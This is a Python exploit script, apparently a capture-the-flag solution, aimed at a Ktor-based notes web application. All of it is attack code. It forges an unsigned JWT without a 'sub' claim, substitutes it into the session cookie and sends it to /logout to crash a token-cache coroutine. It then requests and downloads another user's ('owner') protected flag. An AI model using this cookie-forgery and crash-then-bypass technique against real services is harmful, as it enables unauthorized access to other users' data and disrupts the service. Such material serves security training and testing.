import requests
import time
import urllib.parse
import base64
import json
import sys
import re

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip('=')

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 solve.py <url>")
        return
    url = sys.argv[1].rstrip('/')
    
    s = requests.Session()
    
    # 1. Register a user
    username = "attacker" + str(int(time.time()))
    password = "password"
    print(f"[*] Registering user {username}")
    res = s.post(f"{url}/register", data={"username": username, "password": password})
    
    session_cookie = s.cookies.get("SESSION")
    if not session_cookie:
        print("[-] Failed to get SESSION cookie")
        return
    print(f"[*] Valid SESSION cookie: {session_cookie}")
    
    decoded_cookie = urllib.parse.unquote(session_cookie)
    print(f"[*] Decoded cookie: {decoded_cookie}")
    
    # Extract the token
    token = ""
    if "{" in decoded_cookie:
        try:
            cookie_data = json.loads(decoded_cookie)
            token = cookie_data.get("token", "")
        except:
            pass
    
    if not token:
        # Maybe it's form-urlencoded like token=eyJ...
        match = re.search(r'token=([^&]+)', decoded_cookie)
        if match:
            token = match.group(1)
            # Sometimes Ktor prepends # to strings in reflection serializer
            if token.startswith('#'):
                token = token[1:]
    
    if not token:
        print("[-] Could not extract token from cookie")
        # Just fallback to assuming JSON
        token = "dummy"
    
    print(f"[*] Extracted token: {token}")
    
    # 2. Create a malicious JWT without 'sub' claim
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"exp": int(time.time()) + 3600} # No 'sub' claim
    
    malicious_jwt = f"{b64url_encode(json.dumps(header))}.{b64url_encode(json.dumps(payload))}.dummy"
    print(f"[*] Malicious JWT: {malicious_jwt}")
    
    # 3. Create a malicious SESSION cookie
    malicious_cookie_value = session_cookie.replace(urllib.parse.quote(token), urllib.parse.quote(malicious_jwt))
    if malicious_cookie_value == session_cookie:
        # Try replacing unquoted
        malicious_cookie_value = session_cookie.replace(token, malicious_jwt)
    
    print(f"[*] Malicious SESSION cookie: {malicious_cookie_value}")
    
    # 4. Send the malicious cookie to /logout to crash the background coroutine
    print("[*] Sending malicious token to /logout to crash the TokenCache coroutine")
    res = requests.post(f"{url}/logout", cookies={"SESSION": malicious_cookie_value}, allow_redirects=False)
    print(f"[*] Logout response: {res.status_code}")
    
    # Wait a bit for the coroutine to process and crash
    time.sleep(2)
    
    # 5. Request flag download with our VALID token
    print("[*] Requesting flag download for user 'owner'")
    res = s.post(f"{url}/notes/request-download", data={"username": "owner"})
    print(f"[*] Download request response: {res.text}")
    
    # 6. Wait 5 minutes (300 seconds)
    print("[*] Waiting 305 seconds for the download to be ready...")
    for i in range(305):
        if i % 10 == 0:
            print(f"    ... {305 - i} seconds left")
        time.sleep(1)
    
    # 7. Download the flag
    print("[*] Downloading the flag")
    res = s.post(f"{url}/notes/request-download", data={"username": "owner"})
    print(f"[*] Flag response: {res.text}")

if __name__ == "__main__":
    main()
